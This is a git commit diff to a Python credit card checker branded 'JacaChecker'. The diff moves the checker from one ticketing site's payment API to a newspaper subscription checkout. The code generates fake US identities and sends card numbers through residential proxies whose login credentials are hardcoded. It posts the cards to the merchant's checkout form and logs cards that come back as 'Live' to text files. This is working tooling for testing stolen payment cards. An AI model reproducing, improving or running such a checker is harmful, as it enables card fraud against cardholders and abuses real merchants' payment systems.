cad1daafc8e2e0f3dea289708e94944e86cf1602
jacagift <166239691+jacagift@users.noreply.github.com>
2024-04-10 18:28:34 -0300

    Update api.py

--- api.py
+++ api.py
@@ -104,7 +104,7 @@ def checker(card, month, year, cvv):
             
         
 
-            
+            #p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2:gh5fkkxopi4c@brd.superproxy.io:22225'}
             url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
             headers = {
                     'Host': 'randomuser.me',
@@ -136,126 +136,164 @@ def checker(card, month, year, cvv):
             if response.status_code == 200:
           
                     
+            start_time = time.time()  
+            url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
+            headers = {
+                    'Host': 'randomuser.me',
+                    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
+                    'accept': 'application/json, text/plain, */*',
+                    'sec-ch-ua-mobile': '?0',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'origin': 'https://namso-gen.com',
+                    'sec-fetch-site': 'cross-site',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-dest': 'empty',
+                    'referer': 'https://namso-gen.com/',
+                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
+                    }
 
+            response = requests.get( url, headers=headers, verify=False)
+            email = pegarItem(response.text, '"email":"','"')
+            nome = pegarItem(response.text, '"first":"','"')
+            sobrenome = pegarItem(response.text, '"last":"','"')
+            street = pegarItem(response.text, '"name":"','"},"city"')
+            snumber = pegarItem(response.text, '"street":{"number":',',')
+            city = pegarItem(response.text, '"city":"','"')
+            state = pegarItem(response.text, '"state":"','"')
+            state = state[0:2]
+            postcode = pegarItem(response.text, '"postcode":',',')
+            company = pegarItem(response.text, '"username":"','"')
+            tel = random.randint(1111,9999)
+            tel2 = random.randint(111,999)
+            tel3 = random.randint(111,999)
+            time.sleep(2)
             
-                p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
+            if response.status_code == 200:
+                time.sleep(5)
+                p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
                 start_time = time.time() 
-                recap = criarTask()
-        
-        
-        
-        
-        
-                        
-                url = f"https://holdmyticket.com/api/shop/processors/get_authentication_key?captcha_token={recap}"
+
+                
+                
+                url = "https://timberjay.creativecirclemedia.com/subscribe/"
 
                 payload = {}
                 headers = {
-                'Host': 'holdmyticket.com',
+                'Host': 'timberjay.creativecirclemedia.com',
+                'Cache-Control': 'max-age=0',
+                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'Upgrade-Insecure-Requests': '1',
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-                'Accept': '*/*',
-                'Origin': 'https://tickets.holdmyticket.com',
-                'Referer': 'https://tickets.holdmyticket.com/',
-                #'Cookie': '_fbp=fb.1.1712014315500.1863181539; PHPSESSID=0b5fb7f955ebe8f673edd97fa4fd3a97; _gid=GA1.2.219304938.1712270413; _gat=1; _ga=GA1.1.1072852156.1712014452; _ga_6BRBZCZGJH=GS1.2.1712270413.3.1.1712270597.41.0.0; _ga_4Y1SMXCRK4=GS1.1.1712270413.3.1.1712270612.0.0.0'
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-User': '?1',
+                'Sec-Fetch-Dest': 'document',
+                'Referer': 'https://timberjay.creativecirclemedia.com/account/',
+                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Cookie': '_ga=GA1.1.2107239214.1712781430; MEDIASITEQ=7ttprhgvtc3adnspjs356pfjkr; cq_user_id=6598; _ga_WPLJXE6REZ=GS1.1.1712781430.1.1.1712781666.0.0.0'
                 }
 
-                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=1000)
-                print(response.text)
-                auth_key = response.json()['authenticationKey']
-
-
-                url = "https://api.fullsteampay.net/api/token/card/clearText/create"
-
-                payload = {
-                    "clearTextCardData": {
-                        "cardNumber": card,
-                        "cvv": "",
-                        "expirationMonth": month,
-                        "expirationYear": year,
-                        "billingInformation": {
-                            "nameOnAccount": f"{nome} {sobrenome}",
-                            "firstName": nome,
-                            "lastName": sobrenome,
-                            "address1": f"{snumber} {street}",
-                            "address2": None,
-                            "city": city,
-                            "state": state,
-                            "zip": postcode,
-                            "country": "US",
-                            "phone": f"{tel}00092",
-                            "email": email
-                        }
-                    },
-                    "cardEntryContext": 5,
-                    "performAccountVerification": True
-                }
-                headers = {
-                'Host': 'api.fullsteampay.net',
-                'processor-compat-ver': '1',
-                'content-type': 'application/json;charset=UTF-8',
-                'authenticationkey': auth_key,
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-                'accept': '*/*',
-                'origin': 'https://tickets.holdmyticket.com',
-                'referer': 'https://tickets.holdmyticket.com/',
-                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
-                }
-
-                response = requests.request("POST", url, headers=headers, json=payload, verify=False, proxies=p)
-                elapsed_time = time.time() - start_time
-                print(response.text)
-                MSegundos = round(elapsed_time, 2)
+                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
+                token = pegarItem(response.text, "<input type='hidden' name='csrf_token' value='","'>")
                 
-                if 'Retry Transaction' in response.text:
-                    code = response.json()['issuerResponseDetails']['issuerResponseCode']
+                
+                
+                
+                url = "https://timberjay.creativecirclemedia.com/subscribe/?"
+
+                payload = f'process=checkout&rate=57&price=118.00&promo=&content=&content_id=&referer=&subscriber_number=&payee_note=&quantity=&csrf_token={token}&firstname=james&lastname=deamn&street=3065%20Tradeport%20Dr&street2=209315&city=Orlando&state=FL&zip=32824&title=mr&company=mr&phone=8013006333&email=9cu324hfvc98743%40gmail.com&billing_same=1&billing_state=FL&cc_number={card}&cc_expires_month={month}&cc_expires_year={year}&cc_cvv=021'
+                headers = {
+                'Host': 'timberjay.creativecirclemedia.com',
+                'Cache-Control': 'max-age=0',
+                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'Upgrade-Insecure-Requests': '1',
+                'Origin': 'https://timberjay.creativecirclemedia.com',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-User': '?1',
+                'Sec-Fetch-Dest': 'document',
+                'Referer': 'https://timberjay.creativecirclemedia.com/subscribe/',
+                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Cookie': '_ga=GA1.1.2107239214.1712781430; MEDIASITEQ=7ttprhgvtc3adnspjs356pfjkr; cq_user_id=6598; _ga_WPLJXE6REZ=GS1.1.1712781430.1.1.1712781674.0.0.0',
+                'Content-Type': 'application/x-www-form-urlencoded'
+                }
+
+                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
+                            
+                
+                
+                time.sleep(4)
+                
+                    
+                    
+                elapsed_time = time.time() - start_time
+                
+                MSegundos = round(elapsed_time, 2)
+            
+                    
+                    
+                if 'avs' in response.text:
                     bin = api_bin(card[:6])              
-                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry {code} [{MSegundos}] MS"                          
-                    open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry {code} [{MSegundos}] #JacaChecker\n")
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS [{MSegundos}] MS"                          
+                    open("newzware.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} avs  [{MSegundos}] #JacaChecker\n")
                     print(Fore.GREEN + f"{x} #JacaChecker")     
                     return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                 
-                elif 'issuerResponseCode":"85"' in response.text:
-                    code = response.json()['issuerResponseDetails']['issuerResponseCode']
+                elif 'Insufficient funds' in response.text:
                     bin = api_bin(card[:6])              
-                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS {code} [{MSegundos}] MS"                          
-                    open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} AVS {code} [{MSegundos}] #JacaChecker\n") 
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [{MSegundos}] MS"                          
+                    open("newzware.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
                     print(Fore.GREEN + f"{x} #JacaChecker") 
                     return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
-                    
-                elif 'issuerResponseCode":"46"' in response.text:
-                    code = response.json()['issuerResponseDetails']['issuerResponseCode']
+                        
+                elif 'An error occurred during processing' in response.text:
                     bin = api_bin(card[:6])              
-                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Closed {code} [{MSegundos}] MS"                          
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [{MSegundos}] MS"                          
+                    open("newzware.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
+                    print(Fore.GREEN + f"{x} #JacaChecker") 
+                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                            
+
+                    
+                elif 'alert alert-danger' in response.text:  
+                    code = pegarItem(response.text, '<div class="alert alert-danger text-center">','</div>')
+                    bin = api_bin(card[:6])
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {code} [{MSegundos}] MS"     
                     print(Fore.RED + f"{x} #JacaChecker")  
                     return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                     
-                        
-                elif 'issuerResponseDetails' in response.text:
-                    response = response.json()['issuerResponseDetails']['issuerResponseDescription']
-                    bin = api_bin(card[:6])
-                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response} [{MSegundos}] MS"     
-                    print(Fore.RED + f"{x} #JacaChecker")  
-                    return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}                       
-
+                    
                 else:
                     
-                    print(Fore.RED + 'Gateway Timeout')
-                    return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}     
+                    print(Fore.RED + 'Gateway Timeout' + response.text)
+                    return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
+                
+                    
+                    
+
+                        
 
                     
         except requests.exceptions.ProxyError:
             print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
-            #reteste(card, month, year, cvv)
-            
+            reteste(card, month, year, cvv)
         except requests.exceptions.ConnectionError:
             print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
-            #reteste(card, month, year, cvv)
+            reteste(card, month, year, cvv)
         except requests.exceptions.RequestException:
             print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
-            #reteste(card, month, year, cvv)
+            reteste(card, month, year, cvv)
         except RequisicaoException:
             print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
-            #reteste(card, month, year, cvv)
+            reteste(card, month, year, cvv)
             
             
 
@@ -268,8 +306,8 @@ def processar_cartoes(card,mes,ano,cvv):
         else:
             return {"code": "", "retorno": "erro no formulario"}
     except:
-        retorno = checker(card,mes,ano,cvv)
-        return {"code": "", "retorno": "Exception no processamento !"}
+        #retorno = checker(card,mes,ano,cvv)
+        return {"code": "", "retorno": "Exception"}
     
     
 
